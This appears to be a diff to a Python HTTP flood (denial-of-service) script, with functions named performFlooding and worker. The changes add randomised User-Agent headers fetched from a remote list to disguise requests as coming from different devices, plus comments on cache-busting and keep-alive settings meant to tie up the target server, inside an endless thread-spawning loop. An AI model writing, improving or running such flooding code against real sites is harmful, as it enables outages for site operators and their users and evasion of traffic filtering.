@@ -51,11 +51,11 @@ def performFlooding():
     logger.info(f"Targeted URL: {url}")
     if len(sys.argv) > 2:
         THREAD_LIMIT = sys.argv[2]
-    response = requests.get(USER_AGENTS_URL)
+    response = requests.get(USER_AGENTS_URL) # get user agents to simulate request are coming from different devices :)
     if response.status_code == 200:
         UA = response.text.split("\n")
     elif response.status_code == 404:
-        logger.error("Cant fetch User Agents")
+        logger.error("Can't fetch User Agents")
     i = 0
     while True:
         if len(THREADS) < THREAD_LIMIT:
@@ -82,13 +82,14 @@ def worker(url, ua):
         url = parsed_url._replace(query=new_query).geturl()
         host = parsed_url.hostname
         headers = {
-            "Cache-Control": "no-cache",
+            "User-Agent": random.choice(UA), # pick randomly user agent 
+            "Cache-Control": "no-cache", # don't cache request, in the case same one repeats
             "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",  # accept most of the encoding
             "Referer": r,
             "Keep-Alive": str(
                 random.randint(KEEP_ALIVIE_MIN, KEEP_ALIVIE_MAX)
             ),  # don't close it too soon, otherwise it's no use :)
-            "Connection": "keep-alive",
+            "Connection": "keep-alive", # keep it alive :)
             "Host": host,
         }
         req = Request(url, headers=headers)
